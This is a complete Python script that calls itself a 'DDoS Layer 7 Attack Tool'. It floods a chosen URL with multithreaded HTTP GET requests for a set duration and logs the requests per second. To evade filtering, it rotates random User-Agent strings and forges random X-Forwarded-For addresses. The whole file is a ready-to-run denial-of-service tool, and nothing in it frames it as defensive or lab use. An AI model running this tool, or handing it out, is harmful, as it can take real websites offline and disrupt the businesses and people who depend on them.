#!/usr/bin/env python3
import socket
import threading
import random
import time
import argparse
import logging
import os
import psutil
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
import requests
from urllib3.exceptions import InsecureRequestWarning
from datetime import datetime

# Cấu hình logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f'ddos_attack_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
        logging.StreamHandler()
    ]
)

# Tắt cảnh báo SSL
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class DDoSLayer7:
    def __init__(self, target_url, num_threads=100, duration=60, rate_limit=10, verify_ssl=True):
        self.target_url = target_url
        self.num_threads = num_threads
        self.duration = duration
        self.rate_limit = rate_limit
        self.verify_ssl = verify_ssl
        self.ua = UserAgent()
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = None
        self.stop_flag = False
        self.last_request_time = time.time()
        self.lock = threading.Lock()

    def generate_headers(self):
        return {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        }

    def rate_limit_delay(self):
        now = time.time()
        time_since_last_request = now - self.last_request_time
        min_delay = 1.0 / self.rate_limit
        
        if time_since_last_request < min_delay:
            time.sleep(min_delay - time_since_last_request)
        
        self.last_request_time = time.time()

    def check_memory_usage(self):
        process = psutil.Process(os.getpid())
        memory_info = process.memory_info()
        return {
            'rss': f"{memory_info.rss / 1024 / 1024:.1f}MB",
            'vms': f"{memory_info.vms / 1024 / 1024:.1f}MB"
        }

    def attack(self):
        while not self.stop_flag:
            try:
                self.rate_limit_delay()
                
                response = requests.get(
                    self.target_url,
                    headers=self.generate_headers(),
                    verify=self.verify_ssl,
                    timeout=5
                )
                
                with self.lock:
                    if response.status_code == 200:
                        self.successful_requests += 1
                    else:
                        self.failed_requests += 1
                        logging.warning(f"Request failed with status code: {response.status_code}")
                
            except requests.exceptions.RequestException as e:
                with self.lock:
                    self.failed_requests += 1
                logging.error(f"Request error: {str(e)}")
                time.sleep(1)  # Delay on connection errors
            except Exception as e:
                with self.lock:
                    self.failed_requests += 1
                logging.error(f"Unexpected error: {str(e)}")

    def start(self):
        logging.info(f"Starting DDoS Layer 7 attack on {self.target_url}")
        logging.info(f"Number of threads: {self.num_threads}")
        logging.info(f"Duration: {self.duration} seconds")
        logging.info(f"Rate limit: {self.rate_limit} requests/second/thread")
        logging.info(f"CPU Cores: {os.cpu_count()}")
        
        self.start_time = time.time()
        self.stop_flag = False

        with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
            futures = [executor.submit(self.attack) for _ in range(self.num_threads)]
            
            try:
                while time.time() - self.start_time < self.duration:
                    time.sleep(1)
                    elapsed = time.time() - self.start_time
                    total_requests = self.successful_requests + self.failed_requests
                    rps = total_requests / elapsed if elapsed > 0 else 0
                    
                    memory_usage = self.check_memory_usage()
                    logging.info(
                        f"Progress: {elapsed:.1f}s | "
                        f"Successful: {self.successful_requests} | "
                        f"Failed: {self.failed_requests} | "
                        f"RPS: {rps:.1f} | "
                        f"Memory: {memory_usage['rss']}"
                    )
            except KeyboardInterrupt:
                logging.warning("Attack stopped by user")
            finally:
                self.stop_flag = True
                for future in futures:
                    future.cancel()

        self.print_stats()

    def stop(self):
        self.stop_flag = True

    def print_stats(self):
        total_time = time.time() - self.start_time
        total_requests = self.successful_requests + self.failed_requests
        rps = total_requests / total_time if total_time > 0 else 0
        memory_usage = self.check_memory_usage()

        logging.info("Attack completed")
        logging.info(f"Total time: {total_time:.1f} seconds")
        logging.info(f"Total successful requests: {self.successful_requests}")
        logging.info(f"Total failed requests: {self.failed_requests}")
        logging.info(f"Total requests: {total_requests}")
        logging.info(f"Average RPS: {rps:.1f}")
        logging.info(f"Final memory usage: {memory_usage['rss']}")

def main():
    parser = argparse.ArgumentParser(description='DDoS Layer 7 Attack Tool')
    parser.add_argument('target', help='Target URL (e.g., http://example.com)')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads (default: 100)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds (default: 60)')
    parser.add_argument('-r', '--rate', type=int, default=10, help='Requests per second per thread (default: 10)')
    parser.add_argument('--no-ssl-verify', action='store_true', help='Disable SSL verification')
    
    args = parser.parse_args()
    
    if not args.target.startswith(('http://', 'https://')):
        logging.error("Target URL must start with http:// or https://")
        return

    ddos = DDoSLayer7(
        args.target,
        args.threads,
        args.duration,
        args.rate,
        not args.no_ssl_verify
    )
    ddos.start()

if __name__ == "__main__":
    main() 